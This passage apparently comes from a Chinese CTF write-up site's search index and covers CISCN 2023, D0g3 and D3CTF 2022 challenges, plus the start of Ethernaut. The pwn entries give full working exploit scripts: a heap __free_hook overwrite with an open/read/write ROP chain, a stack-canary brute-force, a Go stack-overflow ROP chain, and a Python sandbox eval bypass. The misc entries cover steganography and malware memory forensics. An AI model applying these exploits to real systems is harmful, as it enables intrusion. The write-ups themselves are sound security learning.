\u7684\u5730\u65b9\u8fc1\u79fb\u6808\u5e76 ROP \u5bf9 flag \u8fdb\u884c open read write \u5373\u53ef</li> </ul> exp <pre><code>from exp_pb2 import *\n\n...\n\ndef send(_id, idx, size, buf):\n    msg = Msg()\n    msg.id = _id &lt;&lt; 1\n    msg.idx = idx &lt;&lt; 1\n    msg.size = size &lt;&lt; 1\n    msg.buf = buf\n    return msg.SerializeToString()\n\ndef create(idx, size, content):\n    p.sendafter(b\": \\n\", send(1, idx, size, content))\n\ndef update(idx, content):\n    p.sendafter(b\": \\n\", send(2, idx, 0xf0, content))\n\ndef print_(idx):\n    p.sendafter(b\": \\n\", send(3, idx, 3, b\"AAA\"))\n\ndef delete(idx):\n    p.sendafter(b\": \\n\", send(4, idx, 3, b\"AAA\"))\n\nfor i in range(1, 9):\n    create(i, 0x80, b\"AAA\")\npause()\n\nfor i in range(8, 0, -1):\n    delete(i)\npause()\n\nprint_(1)\np.recvn(0x70)\nlibc.address = u64(p.recvn(0x8)) - 0x1ECBE0\n\ncreate(10, 0xf0, b\"AAA\")\ncreate(11, 0xf0, b\"AAA\")\ndelete(11)\ndelete(10)\nupdate(10, p64(libc.sym['__free_hook']))\ncreate(12, 0xf0, p64(0) + p64(libc.sym['__free_hook'] + 0x10))\ncreate(13, 0xf0, b\"a\")\n\n\"\"\"\n0x0000000000047445 : add rsp, 0x28 ; ret\n0x000000000005b4d0 : mov rsp, rdx ; ret\n0x0000000000023b6a : pop rdi ; ret\n0x000000000002601f : pop rsi ; ret\n0x0000000000142c92 : pop rdx ; ret\n0x0000000000151990 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]\n\"\"\"\n\nadd_rsp_ret = libc.address + 0x47445\nmov_rsp_rdx_ret = libc.address + 0x5b4d0\npop_rdi_ret = libc.address + 0x23b6a\npop_rsi_ret = libc.address + 0x2601f\npop_rdx_ret = libc.address + 0x142c92\ngadget = libc.address + 0x151990\n\npayload  = p64(gadget)\npayload += p64(libc.sym[\"__free_hook\"] + 0x10)\npayload += p64(add_rsp_ret)\npayload += p64(0)\npayload += p64(0)\npayload += p64(0)\npayload += p64(mov_rsp_rdx_ret)\npayload += p64(0)\npayload += p64(pop_rdi_ret)\npayload += p64(libc.sym[\"__free_hook\"] + 0xc0)\npayload += p64(pop_rsi_ret)\npayload += p64(0)\npayload += p64(libc.sym[\"open\"])\npayload += p64(pop_rdi_ret)\npayload += p64(3)\npayload += p64(pop_rsi_ret)\npayload += p64(libc.sym[\"__free_hook\"] - 0x100)\npayload += p64(pop_rdx_ret)\npayload += p64(0x100)\npayload += p64(libc.sym[\"read\"])\npayload += p64(pop_rdi_ret)\npayload += p64(libc.sym[\"__free_hook\"] - 0x100)\npayload += p64(libc.sym[\"puts\"])\npayload += p64(0)\npayload += b\"./flag\\x00\"\n\nupdate(13, payload)\ndelete(12)\n\np.interactive()\n</code></pre>"},{"location":"writeups/ciscn2023/#funcanary","title":"funcanary","text":"<p>\u4e00\u4e2a\u4e0d\u65ad fork \u7684\u7a0b\u5e8f\uff0c\u56e0\u4e3a fork \u521b\u5efa\u5b50\u8fdb\u7a0b\u65f6\u62f7\u8d1d\u5168\u90e8\u5185\u5b58\uff0c\u6240\u4ee5 canary \u4e0d\u4f1a\u53d8\uff0c\u51fd\u6570\u5730\u5740\u4e5f\u90fd\u4e0d\u4f1a\u53d8\u3002</p> <p>\u6240\u4ee5\u9010\u5b57\u8282\u7206\u7834 canary\uff0c\u7136\u540e\u7206\u7834\u8986\u76d6\u8fd4\u56de\u5730\u5740\u672b\u5c3e\uff0c\u76f4\u5230\u6b63\u786e\u8dd1\u5230\u540e\u95e8\u5730\u5740\u4e3a\u6b62\uff1a</p> exp <pre><code>canary = b\"\\x00\"\n\np.recv()\n\nfor i in range(7):\n    for j in range(256):\n        payload = b\"A\" * 0x68 + canary + p8(j)\n        p.send(payload)\n        p.recvline()\n        res = p.recvline()\n        if b\"stack smashing\" not in res:\n            info(f\"canary[{i}] = {hex(j)}\")\n            canary += p8(j)\n            break\n    assert(len(canary) == i + 2)\n\nsuccess(f\"canary = {canary}\")\n\ncontext.log_level = \"debug\"\n\nfor j in range(0x100):\n    payload = b\"A\" * 0x68 + canary + b\"A\" * 8 + p8(0x2E) + p8(j)\n    p.send(payload)\n    res = p.recv()\n    if b\"flag\" in res:\n        print(res)\n        break\n</code></pre>"},{"location":"writeups/ciscn2023/#shell-we-go","title":"Shell We Go","text":"<p>go \u9006\u5411\uff0c\u901a\u8fc7\u641c\u7d22\u5173\u952e\u5b57\u7b26\u4e32\uff0c\u77e5\u9053\u51fd\u6570 sub_4C1900 \u5904\u4e3a\u5904\u7406\u547d\u4ee4\u7684\u51fd\u6570\uff0c\u5176\u4e2d\u8ddf\u7740 cert \u547d\u4ee4\u53ef\u4ee5\u77e5\u9053\u63a5\u4e0b\u6765\u9700\u8981\u8f93\u5165 nAcDsMicN \u7136\u540e\u5269\u4f59\u5185\u5bb9\u5728 sub_4C14A0 \u51fd\u6570\u4e2d\u8fdb\u884c\u5224\u65ad\u3002</p> <p>\u6839\u636e IDA finger \u7684\u89e3\u6790\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e2d\u5148\u5bf9\u8f93\u5165\u8fdb\u884c\u4e86 rc4 \u52a0\u5bc6\uff0c\u5bc6\u94a5\u4e3a F1nallB1rd3K3y\uff0c\u7136\u540e\u5bf9\u7ed3\u679c Base64 \u540e\u4e0e JLIX8pbSvYZu/WaG \u6bd4\u8f83\uff0c\u8fd4\u56de\u6765\u5373\u53ef\u5f97\u5230 cert \u8ba4\u8bc1\u7684\u5185\u5bb9 <code>S33UAga1n@#!</code></p> <p>\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u8fdb\u884c shell \u64cd\u4f5c\uff0cls \u76f4\u63a5\u8c03\u7528 os\uff0ccd \u76f4\u63a5\u8c03\u7528 os.chdir\uff0ccat \u7981\u6b62\uff0ccat flag \u8f93\u51fa\u5047 flag\uff0cwhoami \u76f4\u63a5\u8f93\u51fa nightingale\uff0cexit \u9000\u51fa\uff0c\u53ea\u6709 echo \u5148\u8f93\u5165\u540e\u8f93\u51fa\uff0c\u6d4b\u8bd5\u5f97\u77e5\u4f1a\u5b58\u5728\u6808\u6ea2\u3002\u800c\u4e14\u6839\u636e\u9006\u5411\uff0c\u9700\u8981\u5148\u7528 0x200 \u4e2a + \u586b\u6ee1 buffer\uff0c\u4e0b\u4e00\u4e2a\u53c2\u6570\u4e2d\u518d\u8fdb\u884c\u8fd4\u56de\u5730\u5740\u7684\u8986\u76d6\u3002</p> <p>\u8c03\u8bd5\u5f97\u77e5\u53ef\u4ee5\u8fdb\u884c\u8fd4\u56de\u5730\u5740\u7684\u8986\u76d6\uff0c\u6240\u4ee5\u8fdb\u884c ROP \u5373\u53ef\uff0c\u56e0\u4e3a flag \u5b57\u7b26\u4e32\u5728\u7a0b\u5e8f\u4e2d\u591a\u6b21\u51fa\u73b0\uff0c\u6240\u4ee5 open read write \u5373\u53ef\u3002</p> exp <pre><code>p.sendlineafter(b\"$ \", b\"cert nAcDsMicN S33UAga1n@#!\")\n# p.interactive()\n\n\"\"\"\n0x000000000040d9e6 : pop rax ; ret\n0x0000000000444fec : pop rdi ; ret\n0x000000000041e818 : pop rsi ; ret\n0x000000000049e11d : pop rdx ; ret\n0x000000000040328c : syscall\n\"\"\"\n\npop_rax_ret = 0x40d9e6\npop_rdi_ret = 0x444fec\npop_rsi_ret = 0x41e818\npop_rdx_ret = 0x49e11d\nsyscall = 0x40328c\nsyscall_ret = 0x4636e9\nflag_str = 0x4c34c8\ndata_buf = 0x59be00\n\npayload = b\"echo \" + b\"+\" * 0x200 + b\" \" + b\"a\" * 4\n\npayload += p64(pop_rax_ret)\npayload += p64(2)\npayload += p64(pop_rdi_ret)\npayload += p64(flag_str)\npayload += p64(pop_rsi_ret)\npayload += p64(0)\npayload += p64(syscall_ret)\n\npayload += p64(pop_rax_ret)\npayload += p64(0)\npayload += p64(pop_rdi_ret)\npayload += p64(3)\npayload += p64(pop_rsi_ret)\npayload += p64(data_buf)\npayload += p64(pop_rdx_ret)\npayload += p64(0x100)\npayload += p64(syscall_ret)\n\npayload += p64(pop_rax_ret)\npayload += p64(1)\npayload += p64(pop_rdi_ret)\npayload += p64(1)\npayload += p64(pop_rsi_ret)\npayload += p64(data_buf)\npayload += p64(pop_rdx_ret)\npayload += p64(0x100)\npayload += p64(syscall_ret)\n\npayload += b\"A\" * 16 + b\"A\" * (0x100 - 23 * 8)\n\ninfo(payload)\n\n# payload += b\"A\" * 0x40\n\np.sendlineafter(b\"# \", payload)\np.interactive()\n</code></pre>"},{"location":"writeups/ciscn2023/#_2","title":"\u88ab\u52a0\u5bc6\u7684\u751f\u4ea7\u6d41\u91cf","text":"<p>modbus TCP \u6d41\u91cf\uff0c\u76f4\u63a5 wireshark \u8ffd\u8e2a TCP \u6d41\uff0c\u53ef\u4ee5\u53d1\u73b0\u524d\u4e00\u90e8\u5206\u5ba2\u6237\u7aef\u6d41\u91cf\u6bcf\u6b21\u672b\u5c3e\u90fd\u6709\u4e24\u4e2a\u53ef\u89c1\u5b57\u7b26\uff0c\u62fc\u5230\u4e00\u8d77\uff1a</p> <p>MMYWMX3GNEYWOXZRGAYDA===</p> <p>Base32 \u7f16\u7801\uff0c\u89e3\u7801\u5f97\u5230 c1f_fi1g_1000\uff0c\u5305\u4e0a flag{} \u5373 flag\u3002</p>"},{"location":"writeups/ciscn2023/#pyshell","title":"pyshell","text":"<p>\u901a\u8fc7\u5c1d\u8bd5\u5f97\u77e5\u6c99\u7bb1\u9650\u5236\u7684\u662f\u6bcf\u6b21\u8f93\u5165\u7684\u957f\u5ea6\u3002</p> <p>\u6240\u4ee5\u4f7f\u7528 python shell \u6bcf\u6b21\u7ed3\u679c\u4f5c\u4e3a _ \u53d8\u91cf\u7684\u503c\u7684\u7279\u6027\u8fdb\u884c\u62fc\u63a5\u4ee5\u53ca eval \u5373\u53ef\uff1a</p> <pre><code>'open('\n_+'\"/f'\n_+'lag'\n_+'\").'\n_+'rea'\n_+'d()'\neval(_)\n</code></pre>"},{"location":"writeups/d0g3/","title":"\u7b2c\u56db\u5c4a\u201c\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b Writeup","text":"<p> \u7ea6 404 \u4e2a\u5b57  81 \u884c\u4ee3\u7801  15 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u8fd9\u6b21\u7684 misc \u7b97\u662f\u505a\u5f97\u6bd4\u8f83\u597d\uff0c\u4e0b\u9762\u662f writeup</p>"},{"location":"writeups/d0g3/#cthulhu-mythos","title":"Cthulhu Mythos","text":"<p>hint.mp3 \u5f00\u5934\u662f\u300aOverworld Day\u300b\u6cf0\u62c9\u745e\u4e9aOST</p> <p>\u540e\u9762\u662fSSTV\uff0cScottie1\u6a21\u5f0f\u3002\u5f97\u5230\u56fe\u7247\uff1a</p> <p></p> <pre><code>MRPVI4TZL5KGK4TSGRZGSYJBPU======\n</code></pre> <p>Base32 \u89e3\u7801\uff1a<code>d_Try_Terr4ria!}</code> </p> <p>\u4ece\u56fe\u7247\u4e5f\u80fd\u770b\u51fa\u8fd9\u662f\u4e00\u4e2a Base32 \u7684\u540e\u534a\u90e8\u5206\uff0c\u9700\u8981\u627e\u524d\u9762\u7684\u4e00\u622a</p> <p>\u7136\u540e\u6253\u5f00\u90a3\u4e2awld\u6587\u4ef6\uff1a</p> <p></p> <p><code>7I4YF6QLO</code></p> <p>\u4ed4\u7ec6\u627e\u8fd8\u53ef\u4ee5\u53d1\u73b0\u56db\u4e2a\u7bb1\u5b50\uff1a</p> \u7bb1\u5b50 <p></p> <p></p> <p></p> <p></p> <p>3\u6761\u62fc\u5728\u4e00\u8d77\u662f\u5b8c\u6574\u7684 Base32</p> <p><code>IQYGOM33JUYW4ZLDKI2GM5C7I4YF6QLOMRPVI4TZL5KGK4TSGRZGSYJBPU======</code></p> <p>Base32\uff1a<code>D0g3{M1necR4ft_G0_And_Try_Terr4ria!}</code> </p>"},{"location":"writeups/d0g3/#lovemath","title":"lovemath","text":"<p>\u6839\u636e\u9898\u5e72\u53ef\u4ee5\u63a8\u6d4b\u51fa\u8981\u7528\u5230 Tupper's Self-Referential Formula</p> <p>\u5148\u770b\u538b\u7f29\u5305</p> <p></p> <p>flag\u649eCRC\u6821\u9a8c</p> <p>\u5bc6\u7801: <code>th1s_Is_Y0ur_pa33w0rd_We1c0m3e</code></p> <p>\u89e3\u538b\u51fa\u6765\u7684\u56fe\u7247:</p> <p></p> <p>\u8fd9\u4e2a\u4e22\u8fdb stegsolve \u540e red 0 \u6bd4\u8f83\u8be1\u5f02\uff0c\u6240\u4ee5\u7528 LSB \u9690\u5199\u8bd5\u8bd5</p> <p></p> <p></p> <p>\u5220\u6389\u5f00\u5934\u7684\u810f\u6570\u636e\u5f97\u5230\uff1a</p> <p></p> <p>\u8fd9\u4e2a\u8f6c\u6587\u5b57\u8f93\u5230 Tupper's Self-Referential Formula \u7684\u5728\u7ebf\u7f51\u7ad9 https://tuppers-formula.ovh/ \u91cc</p> <pre><code>1251077695482776025338577125579215707216262981842821000162276994967943212822693842845266851984880336702446444408289977864567921038435144120176357529686342977212633764247620567669441602729004003473312468776582473461071462631554533766709934484393185739708817165738912742570170547790145328253304755428563911689057632001795598667127514331122190795355921436735375126688142856470280128821316586008242687241930886868804388482643589009068543771977163419519208340324352\n</code></pre> <p></p> <p><code>D0g3{I_LOV3_math}</code></p>"},{"location":"writeups/d0g3/#cyzcc_loves_lol","title":"CyzCC_loves_LOL","text":"<p>\u5f00\u59cb\u662f LOLcode\uff0c\u8f6c\u6362\u5f97\u5230\u538b\u7f29\u5305\u5bc6\u7801 <code>AGdJfpqebmXpptloa</code></p> <p>\u5f97\u5230\u4e24\u5f20\u56fe\u7247\uff0c\u4e00\u5f20\u540d\u5b57\u662f <code>jinx's_flag_in_silent.jpg</code> \u63a8\u6d4b\u662f\u7528\u4e86 SilentEye \u8fd9\u4e2a\u8f6f\u4ef6\u85cf\u4e86 flag\uff0c\u9700\u8981\u4e00\u4e2a\u5bc6\u7801</p> <p>\u7b2c\u4e8c\u4e2a\u56fe\u7247\u662f\u4e00\u4e2a\u5f88\u5c0f\u7684\u50cf\u7d20\u56fe\uff0c\u8f93\u51fa\u4e86\u4e00\u4e0b\uff0c\u989c\u8272\u4e00\u5171\u6709 10 \u79cd\uff1a <pre><code>#800000FF\n#008000FF\n#000000FF\n#0000FFFF\n#FFFF00FF\n#00FFFFFF\n#FF0000FF\n#00FF00FF\n#008080FF\n#808000FF\n</code></pre></p> <p>\u6240\u4ee5\u5e94\u8be5\u662f Brainloller \u800c\u4e0d\u662f Piet\uff0c\u4ece\u5728\u7ebf\u7f51\u7ad9 https://minond.xyz/brainloller/ \u6216\u8005\u5199\u4ee3\u7801\u53ef\u4ee5\u8f6c\u6362\u5f97\u5230 brainfuck \u4ee3\u7801 </p> Brainloller\u89e3\u91ca\u5668 <pre><code>from PIL import Image \nimport sys\n\ndef Brainloller(filename):\n    source = Image.open(filename).convert(\"RGB\")\n    width, height = source.size\n    result = ''\n    ptr = (0, 0)\n    direction = 0\n    while True:\n        if ptr[0] &gt;= height or ptr[0] &lt; 0 or ptr[1] &gt;= width or ptr[1] &lt; 0:\n            break\n        else:\n            color = source.getpixel((ptr[1], ptr[0]))\n            if   color == (255,   0,   0): result += '&gt;'\n            elif color == (128,   0,   0): result += '&lt;'\n            elif color == (  0, 255,   0): result += '+'\n            elif color == (  0, 128,   0): result += '-'\n            elif color == (  0,   0, 255): result += '.'\n            elif color == (  0,   0, 128): result += ','\n            elif color == (255, 255,   0): result += '['\n            elif color == (128, 128,   0): result += ']'\n            elif color == (  0, 255, 255): direction = (direction + 1) % 4\n            elif color == (  0, 128, 128): direction = (direction - 1) % 4\n            else: print(f\"[-] Unknown color: {color}\")\n        if   direction == 0: ptr = ptr[0], ptr[1] + 1\n        elif direction == 1: ptr = ptr[0] + 1, ptr[1]\n        elif direction == 2: ptr = ptr[0], ptr[1] - 1\n        elif direction == 3: ptr = ptr[0] - 1, ptr[1]\n\n    print(f\"[+] BrainFuck Code: {result}\")\n    return result\n\ndef Brainfuck(code):\n    code = ''.join(filter(lambda x: x in ['.', ',', '[', ']', '&lt;', '&gt;', '+', '-'], code))\n    bracemap = buildbracemap(code)\n\n    cells, codeptr, cellptr = [0], 0, 0\n    result = ''\n\n    while codeptr &lt; len(code):\n        command = code[codeptr]\n        if command == \"&gt;\":\n            cellptr += 1\n            if cellptr == len(cells): cells.append(0)\n        elif command == \"&lt;\": cellptr = 0 if cellptr &lt;= 0 else cellptr - 1\n        elif command == \"+\": cells[cellptr] = cells[cellptr] + 1 if cells[cellptr] &lt; 255 else 0\n        elif command == \"-\": cells[cellptr] = cells[cellptr] - 1 if cells[cellptr] &gt; 0 else 255\n        elif command == \"[\" and cells[cellptr] == 0: codeptr = bracemap[codeptr]\n        elif command == \"]\" and cells[cellptr] != 0: codeptr = bracemap[codeptr]\n        elif command == \".\": result += chr(cells[cellptr])\n        elif command == \",\": cells[cellptr] = ord(input(\"[*] input one char &gt; \"))\n        codeptr += 1\n\n    print(f\"[+] Result: {result}\")\n\ndef buildbracemap(code):\n    temp_bracestack, bracemap = [], {}\n    for position, command in enumerate(code):\n        if command == \"[\": temp_bracestack.append(position)\n        if command == \"]\":\n            start = temp_bracestack.pop()\n            bracemap[start] = position\n            bracemap[position] = start\n    return bracemap\n\nif __name__ == \"__main__\":\n    Brainfuck(Brainloller(sys.argv[1]))\n</code></pre> <pre><code>-+++++++-+[&lt;++++++++&gt;-]&lt;.&gt;+++++++[&lt;++++&gt;-]&lt;+.+++++++..+++.&gt;&gt;&gt;++++++++[&lt;++++&gt;-]&lt;.&gt;&gt;&gt;++++++++++[&lt;++++-++++&gt;-]&lt;---.&lt;&lt;&lt;&lt;.+++.-+----.--------.&gt;&gt;+.\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\u5b83\u5728\u524d\u9762\u4f1a\u628a\u6307\u9488\u5de6\u79fb\u4e00\u4f4d\uff0c\u6240\u4ee5\u9700\u8981\u628a bf \u89e3\u91ca\u5668\u7684 cell \u7684\u521d\u59cb\u6307\u9488\u53f3\u79fb\u4e00\u4f4d\uff08\u6216\u8005\u5728 bf \u4ee3\u7801\u5f00\u5934\u52a0\u4e00\u4e2a <code>&gt;</code>\uff09</p> <p>\u5f97\u5230\u5bc6\u7801\uff1a<code>0MTTW_CWZVN!</code></p> <p>\u7136\u540e\u7528 SilentEye \u89e3\u5bc6\u90a3\u5f20\u56fe\u7247\u5f97\u5230 flag\uff1a<code>D0g3{544f3225-bbaf-47dc-ba8d-5bda54cbaecb}</code></p>"},{"location":"writeups/d3ctf2022/","title":"D<sup>3</sup>CTF 2022 Writeup","text":"<p> \u7ea6 452 \u4e2a\u5b57  143 \u884c\u4ee3\u7801  10 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Abstract</p> <p>D<sup>3</sup>\uff08Vidar\u3001L\u3001CNSS\uff09\u548c AntSRC \u4e3b\u529e\u7684\u6bd4\u8d5b\uff0cmisc \u9898\u76ee\u8f83\u5c11\uff0c\u4f46\u96be\u5ea6\u4e0d\u4f4e</p>"},{"location":"writeups/d3ctf2022/#badw3ter","title":"BadW3ter","text":"<p>\u6587\u4ef6\u5934\uff1a</p> <p></p> <p>\u5c06 CUY1nw31lai \u6539\u4e3a RIFFWAVEfmt \u5c31\u53ef\u4ee5\u6b63\u5e38\u6253\u5f00\u64ad\u653e</p> <p>\u7531\u9898\u76ee\u4e2d deeper and deeper \u63a8\u6d4b\u4f7f\u7528 deepsound \u8fdb\u884c\u9690\u5199 \u4f7f\u7528 deepsound \u914d\u5408 CUY1nw31lai \u5bc6\u7801\u5f97\u5230</p> <p></p> <p>\u660e\u663e\u662f\u53e0\u52a0\u540e\u7684\u574f\u6389\u7684\u4e8c\u7ef4\u7801\uff0c\u76f4\u63a5\u626b\u63cf</p> <pre><code>Never gonna give you up\nNever gonna let you down\nNever gonna give you up\nNever gonna let you down\nNever gonna give you up\nNever gonna let you down\nNever gonna give you up\nNever gonna let you down\nNever gonna give you up\nNever gonna let you down\nNever gonna give you up\nNever gonna let you down\n</code></pre> <p>\u7531\u4e8e\u662f tiff \u6587\u4ef6\uff0c\u4f1a\u81ea\u5e26\u56fe\u5c42\uff0c\u5220\u6389\u767d\u8272\u80cc\u666f\u56fe\u5c42</p> <p>\u5957\u7528\u5e7b\u5f71\u5766\u514b\u4ee3\u7801\uff1a</p> <pre><code>import cv2\nimport numpy as np\nimport argparse\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='\u63d0\u53d6\u5e7b\u5f71\u5766\u514b')\n    parser.add_argument('input', help='\u8f93\u5165\u56fe')\n    parser.add_argument('output1', help='\u8f93\u51fa\u9690\u85cf\u7684\u56fe')\n    parser.add_argument('output2', help='\u8f93\u51fa\u76f4\u63a5\u5c55\u793a\u7684\u56fe')\n    arg = parser.parse_args()\n\n    img_in = cv2.imread(arg.input, cv2.IMREAD_UNCHANGED)\n\n    if len(img_in.shape) &lt; 3 or img_in.shape[2] != 4:\n        parser.error('\u4f60\u7684\u56fe\u7247\u4e0d\u542balpha\u901a\u9053\uff01')\n\n    b = img_in[:, :, 0].astype(np.float)\n    g = img_in[:, :, 1].astype(np.float)\n    r = img_in[:, :, 2].astype(np.float)\n    a = img_in[:, :, 3].astype(np.float)\n\n    out1 = np.zeros([img_in.shape[0], img_in.shape[1], 3])\n    out2 = np.zeros([img_in.shape[0], img_in.shape[1], 3])\n\n    out1[:, :, 0] = b * a / 255\n    out1[:, :, 1] = g * a / 255\n    out1[:, :, 2] = r * a / 255\n    out2[:, :, 0] = 255 - (255 - b) * a / 255\n    out2[:, :, 1] = 255 - (255 - g) * a / 255\n    out2[:, :, 2] = 255 - (255 - r) * a / 255\n\n    out1 = np.clip(np.floor(out1), 0, 255).astype(np.uint8)\n    out2 = np.clip(np.floor(out2), 0, 255).astype(np.uint8)\n\n    cv2.imwrite(arg.output1, out1)\n    cv2.imwrite(arg.output2, out2)\n</code></pre> <p>\u5f97\u5230</p> <p></p> <p>\uff08\u6216\u8005\u76f4\u63a5\u5728 PS \u91cc\u6539\u80cc\u666f\uff09</p> <p>\u53ef\u4ee5\u626b\u63cf\u51fa flag\uff1aD3CTF{M1r@9e_T@nK_1s_Om0sh1roiii1111!!!!!Isn't_1t?}</p>"},{"location":"writeups/d3ctf2022/#wannawacca","title":"WannaWacca","text":"<p>\u4f7f\u7528 Volatility \u5de5\u5177\u83b7\u53d6\u4e3b\u673a\u4fe1\u606f\uff0c\u901a\u8fc7 netscan \u547d\u4ee4\u83b7\u53d6\u6076\u610f\u8f6f\u4ef6\u8fdb\u7a0b\u53f7 1404</p> <pre><code>vol.py -f d3-win7-5f799647.vmem --profile=Win7SP0x64 netscan\nvol.py -f d3-win7-5f799647.vmem --profile=Win7SP0x64 dumpfiles -Q 0x000000003dec4a70 --dump-dir=./Smart.exe\n</code></pre> <p>\u5f97\u5230 SmartFalcon.exe</p> <p>\u8fdb\u884c upx \u8131\u58f3\uff0c\u4e4b\u540e\u518d\u4fee\u6539\u6076\u610f\u8f6f\u4ef6\u7684 ip (114.116.210.244) \u4fe1\u606f\u5230\u81ea\u5df1\u4e3b\u673a\uff0c\u901a\u8fc7\u7ed9\u7684 pcap \u6d41\u91cf\u91cd\u653e\u6d41\u91cf\u5bf9\u538b\u7f29\u7684 flag.zip \u8fdb\u884c\u89e3\u538b \u5bf9\u89e3\u5bc6\u540e\u7684 flag.zip \u7528 bkcrack \u901a\u8fc7 png \u6587\u4ef6\u5934\u8fdb\u884c\u5df2\u77e5\u660e\u6587\u653b\u51fb\uff0c\u5f97\u5230 key\uff1abd363f25 3a7da3aa 4bbe3175\uff0c\u89e3\u538b flag.zip \u5f97\u5230\u4e0b\u56fe\uff1a</p> <p></p> <p>\u660e\u663e\u7684\u5f69\u8272\u6a2a\u6761\u548c\u80cc\u666f\u82f9\u679c\u6697\u793a\uff0c\u5728\u82f9\u679c\u7684 png \u89e3\u6790\u4e2d\u4f1a\u5448\u73b0\u4e0d\u540c\u7684\u56fe\u50cf\uff1a</p> <p></p> <p>\u5206\u522b\u53d1\u73b0\u4e0a\u8fb9\u548c\u53f3\u4e0b\u89d2\u6709\u610f\u4e49\u4e0d\u660e\u7684\u767d\u8272\u50cf\u7d20\u70b9</p> <p></p> <p></p> <p>\u518d\u7531\u6587\u4ef6\u540d I can\u2019t see any light \u53ef\u4ee5\u63a8\u6d4b\u662f\u76f2\u6587\uff0c\u5e76\u4e14\u7279\u5f81\u660e\u663e\u53ef\u4ee5\u7ffb\u8bd1</p> <p>\u4e0a\u8fb9\u7684\u5f00\u5934\u5c31\u662f\u4e00\u4e2a\u6570\u5b57\u6807\u8bc6\uff0c\u5c1d\u8bd5\u8bfb\u53d6\u4e00\u70b9\u53d1\u73b0\u662f 504B0304\uff0czip \u6587\u4ef6\u5934\uff0c\u5168\u90e8\u8bfb\u53d6\uff1a</p> <pre><code>import numpy as np\nfrom PIL import Image\n\nimg = Image.open(\"braille.png\")\nwidth, height = size = img.size\narr = np.array(img)\n\nBLACK = np.array([0, 0, 0, 255])\nWHITE = np.array([255, 255, 255, 255])\n\nB00 = np.array([BLACK, BLACK])\nB01 = np.array([BLACK, WHITE])\nB10 = np.array([WHITE, BLACK])\nB11 = np.array([WHITE, WHITE])\n\nnum_flag = 0\n\ndef convert(code):\n    global num_flag\n    if (code == np.array([B01, B01, B11])).all():\n        num_flag = 1\n        return \"num\"\n    if (code == np.array([B10, B00, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"1\"\n        else:\n            return \"a\"\n    if (code == np.array([B10, B10, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"2\"\n        else:\n            return \"b\"\n    if (code == np.array([B11, B00, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"3\"\n        else:\n            return \"c\"\n    if (code == np.array([B11, B01, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"4\"\n        else:\n            return \"d\"\n    if (code == np.array([B10, B01, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"5\"\n        else:\n            return \"e\"\n    if (code == np.array([B11, B10, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"6\"\n        else:\n            return \"f\"\n    if (code == np.array([B11, B11, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"7\"\n        else:\n            return \"g\"\n    if (code == np.array([B10, B11, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"8\"\n        else:\n            return \"h\"\n    if (code == np.array([B01, B10, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"9\"\n        else:\n            return \"i\"\n    if (code == np.array([B01, B11, B00])).all():\n        if num_flag:\n            num_flag = 0\n            return \"0\"\n        else:\n            return \"j\"\n\nfor i in range(4):\n    for j in range(960):\n        now = arr[i*3:i*3+3, j*2:j*2+2]\n        res = convert(now)\n        if res != \"num\" and res != None:\n            print(res, end=\"\")\n</code></pre> <p>\u7c98\u8d34\u5165 Hex Fiend\uff0c\u89e3\u538b\u5f97\u5230 Future will lead.txt \u6587\u4ef6\uff0c\u662f The Ray of Light \u6b4c\u8bcd\u6df7\u5165\u4e86\u4e00\u4e9b 0x7F \u5b57\u7b26</p> <p>\u82f9\u679c\u89e3\u91ca\u5668\u53f3\u4e0b\u89d2\u7684\u5185\u5bb9\u76f4\u63a5\u8bfb\u53d6\u65e0\u6cd5\u8bfb\u51fa\u6709\u6548\u5185\u5bb9\uff0c\u8003\u8651\u7ffb\u8f6c 180 \u5ea6\u4ece\u5de6\u5230\u53f3\u8bfb\u53d6\uff0c\u53d1\u73b0\u5927\u5199\u6807\u8bc6\uff0c\u5e76\u4e14\u53ef\u4ee5\u6b63\u5e38\u8bfb\u53d6</p> <p></p> <p>\u4eba\u5de5\u8bfb\u53d6\uff1a</p> <pre><code>VGV4dF9ibGluZF93YXRlcm1hcmsgcHdkIGlzOiBSQHkwZjEhOWh0\n</code></pre> <p>base64\u89e3\u7801\uff1a</p> <pre><code>Text_blind_watermark pwd is: R@y0f1!9ht\n</code></pre> <p> guofei9987/text_blind_watermark</p> <pre><code>from text_blind_watermark import extract\nprint(f\"d3ctf{{{extract(open('Future will lead.txt', 'r').read(), 'R@y0f1!9ht').strip()}}}\")\n</code></pre> <p>flag: d3ctf{b576241258a44b868ea25804b0ec1d4e}</p>"},{"location":"writeups/ethernaut/","title":"Ethernaut Writeups","text":"<p> \u7ea6 3722 \u4e2a\u5b57  1152 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 27 \u5206\u949f</p> <p>Abstract</p> <p>https://ethernaut.openzeppelin.com/ \u4e0a\u7684\u4e00\u7cfb\u5217\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u7c7b\u9898\u76ee\uff0c\u5165\u95e8 blockchain \u7684\u65f6\u5019\u505a\u7684\uff0c\u8fd9\u91cc\u8bb0\u4e0b\u505a\u9898\u8bb0\u5f55</p> <p>\u524d\u7f6e\u6b65\u9aa4\uff1a</p> <ul> <li>\u5b89\u88c5 MetaMask \u6d4f\u89c8\u5668\u63d2\u4ef6\uff0c\u5e76\u521b\u5efa\u65b0\u8d26\u6237</li> <li>\u8fde\u63a5\u5230 Rinkeby \u6d4b\u8bd5\u7f51\u7edc</li> 